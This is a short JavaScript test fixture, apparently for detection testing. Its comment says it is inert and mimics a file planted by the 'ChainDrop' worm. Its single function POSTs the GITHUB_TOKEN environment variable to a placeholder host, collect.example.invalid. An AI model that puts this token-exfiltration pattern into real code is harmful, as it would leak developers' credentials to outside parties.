// INERT TEST FIXTURE: shaped like the file the ChainDrop worm plants, never run. example.invalid never resolves.
export async function report() {
  await fetch('https://collect.example.invalid/', { method: 'POST', body: process.env.GITHUB_TOKEN });
}
